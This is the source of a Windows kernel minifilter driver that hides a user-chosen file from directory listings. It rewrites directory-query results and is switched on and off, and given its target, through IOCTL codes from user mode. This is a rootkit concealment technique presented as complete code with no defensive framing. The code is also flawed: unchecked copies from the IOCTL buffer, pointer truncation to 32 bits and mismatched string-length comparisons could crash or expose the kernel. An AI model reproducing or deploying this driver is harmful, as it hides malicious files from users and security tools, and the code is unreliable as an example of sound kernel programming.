#include <Fltkernel.h>
#include <suppress.h>

int hideContent(PFILE_ID_BOTH_DIR_INFORMATION file);


#define DEVICE_SEND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_WRITE_DATA)
#define DEVICE_REC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_READ_DATA)

UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\FileSystem");
UNICODE_STRING SyLinkName = RTL_CONSTANT_STRING(L"\\??\\FileSystemLink");
PDEVICE_OBJECT DeviceObject = NULL;
short int flg = 1;
wchar_t fileNameHide[256] = { 0 };
wchar_t path[256] = { 0 };
const wchar_t* testFlag = L"settings";
PFLT_FILTER filter = NULL;
FLT_PREOP_CALLBACK_STATUS PfltDcPreOperationCallback(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID *CompletionContext) {
	switch (Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass)
	{
	case FileIdBothDirectoryInformation:
		return FLT_PREOP_SUCCESS_WITH_CALLBACK;
	default:
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}
}
FLT_POSTOP_CALLBACK_STATUS PfltDcPostOperationCallback(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags) {
	if (PsGetCurrentProcessId() == (HANDLE)4) {
		KdPrint(("Kernel Thread.\n"));
		return FLT_POSTOP_FINISHED_PROCESSING;
	}
	if (wcsstr(path, Data->Iopb->TargetFileObject->FileName.Buffer) == 0 || flg)
		return FLT_POSTOP_FINISHED_PROCESSING;
	switch (Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass)
	{
	case FileIdBothDirectoryInformation:
		hideContent((PFILE_ID_BOTH_DIR_INFORMATION)Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer);
		break;
	default:
		break;
	}
	return FLT_POSTOP_FINISHED_PROCESSING;
}
void parseFileName() {
	if (fileNameHide == NULL)
		return;
	wchar_t* pos = fileNameHide, *ppos = fileNameHide;
	while (1) {
		pos = wcsstr(pos + 1, L"\\");
		if (pos == NULL) break;
		ppos = pos;
	}
	KdPrint(("wcslen(fileNameHide): %u - name: %ws\n", wcslen(fileNameHide), fileNameHide));
	KdPrint(("&fileNameHide: %p - &pos: %p - &ppos: %p\n", fileNameHide, pos, ppos));
	memcpy(path, fileNameHide, (wcslen(fileNameHide) - wcslen(ppos) + 1) * 2);
	memcpy(fileNameHide, ppos + 1, (wcslen(ppos) + 1) * 2);
	KdPrint(("Path: %ws - filename: %ws\n", path, fileNameHide));
}
NTSTATUS MiniUnload(FLT_FILTER_UNLOAD_FLAGS Flags) {
	KdPrint(("Unload called.\n"));
	IoDeleteDevice(DeviceObject);
	IoDeleteSymbolicLink(&SyLinkName);
	FltUnregisterFilter(filter);
	return STATUS_SUCCESS;
}
NTSTATUS DispatchPassThru(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
NTSTATUS DispatchDev(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	PIO_STACK_LOCATION IrpS = IoGetCurrentIrpStackLocation(Irp);
	ULONG returnLength = 0;
	PVOID sysBuff = Irp->AssociatedIrp.SystemBuffer;
	switch (IrpS->Parameters.DeviceIoControl.IoControlCode) {
	case DEVICE_SEND:
		KdPrint(("Sent from user: %ws\n", sysBuff));
		if (memcmp(sysBuff, L"on", 4) == 0) {
			flg = 0;
			KdPrint(("on\n"));
			returnLength = 6;
			goto end;
		}
		if (memcmp(sysBuff, L"off", 6) == 0) {
			flg = 1;
			KdPrint(("off\n"));
			returnLength = 8;
			goto end;
		}
		if (memcmp(sysBuff, testFlag, 16)==0) {
			memset(fileNameHide, 0, 256 * 2);
			memcpy(fileNameHide, (PVOID)((char*)sysBuff + 16), 255 * 2);
			returnLength = (wcslen(fileNameHide) + 1) * 2;
			KdPrint(("Filename recieved: %ws", fileNameHide));
			parseFileName();
		}
		break;
	case DEVICE_REC:
		memcpy(sysBuff, fileNameHide, (wcslen(fileNameHide) + 1) * 2);
		returnLength = (wcslen(fileNameHide) + 1) * 2;
		KdPrint(("Filename sent: %ws", fileNameHide));
		break;
	}
end:
	Irp->IoStatus.Information = returnLength;
	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING regPath) {
	KdPrint(("Entry Called.\n"));
	NTSTATUS status;
	const FLT_OPERATION_REGISTRATION CallBacks[] =
	{
		{ IRP_MJ_DIRECTORY_CONTROL,0,PfltDcPreOperationCallback,PfltDcPostOperationCallback },
		{ IRP_MJ_OPERATION_END }
	};
	const FLT_REGISTRATION fltReg = { sizeof(FLT_REGISTRATION),FLT_REGISTRATION_VERSION,0,NULL
		,CallBacks,MiniUnload,0,0,0,0,0,0,0,0 };

	status = FltRegisterFilter(driverObject, &fltReg, &filter);
	if (!NT_SUCCESS(status)) {
		KdPrint(("FltRegister failed.\n"));
		return status;
	}
	status = FltStartFiltering(filter);
	if (!NT_SUCCESS(status)) {
		FltUnregisterFilter(filter);
		KdPrint(("Fltstart failed.\n"));
		return status;
	}
	status = IoCreateDevice(driverObject, NULL, &DeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, NULL, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("IoCreateDevice Failed.\n"));
		return status;
	}
	status = IoCreateSymbolicLink(&SyLinkName, &DeviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("IoCreateSymbolicLink Failed.\n"));
		return status;
	}
	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		driverObject->MajorFunction[i] = DispatchPassThru;
	driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDev;
	return STATUS_SUCCESS;
}
int hideContent(PFILE_ID_BOTH_DIR_INFORMATION file) {
	PFILE_ID_BOTH_DIR_INFORMATION nextInfo = NULL;
	int matched = 0;
	ULONG bytes[2] = { 0 };
	nextInfo = file;
	while (1) {
		if (memcmp(nextInfo->FileName, fileNameHide, wcslen(fileNameHide)) == 0)
			matched = 1;
		if (matched > 0)
			bytes[0] += nextInfo->NextEntryOffset;//5->n
		if (matched == 0)
			bytes[1] += nextInfo->NextEntryOffset;//0->5
		if (nextInfo->NextEntryOffset == 0)
			break;
		nextInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((ULONG)nextInfo + nextInfo->NextEntryOffset);
	}
	memmove((void*)((ULONG)file + bytes[1]), (void*)((ULONG)file + bytes[1] + (((PFILE_ID_BOTH_DIR_INFORMATION)((ULONG)file + bytes[1]))->NextEntryOffset)), bytes[0] + sizeof(nextInfo));
	return 0;
}